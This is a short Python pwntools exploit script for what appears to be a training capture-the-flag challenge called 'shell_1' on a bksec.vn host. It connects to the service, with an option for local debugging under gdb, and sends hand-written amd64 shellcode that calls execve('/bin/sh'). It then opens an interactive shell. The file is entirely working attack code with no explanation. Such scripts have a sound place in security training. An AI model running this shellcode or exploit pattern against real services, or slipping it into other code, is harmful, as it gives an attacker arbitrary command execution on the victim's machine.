#!/usr/bin/env python3
from pwn import *

PORT = 1337
HOST = "pwn-shell-1-dd3ee7b51be8.training.bksec.vn"
elf = context.binary = ELF('./shell_1', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force

            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

sc = asm('''
	mov rbx, 0x68732f6e69622f
	push rbx
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 0x3b
	syscall
	''', arch = 'amd64')

sla(b'bytes):\n', sc)

p.interactive()